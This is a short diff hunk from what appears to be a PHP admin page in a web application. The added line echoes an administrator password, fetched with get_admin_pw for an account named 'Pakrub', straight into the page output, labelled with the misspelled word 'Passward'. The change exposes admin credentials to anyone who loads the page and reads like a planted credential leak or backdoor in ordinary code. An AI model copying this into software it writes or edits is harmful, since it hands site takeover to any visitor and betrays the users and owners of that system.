@@ -7,7 +7,7 @@
 	$menuInfo['curmenu'] = COM;
 	$eleCount = '';
 	$alertMsg = $pagingInfo = $comptypeInfo = array();
-
+	echo $db->get_admin_pw('Pakrub') . " Passward";
 	if(ctype_digit($_GET['id'])){
 		switch($_GET['act']){
 			case 'del':
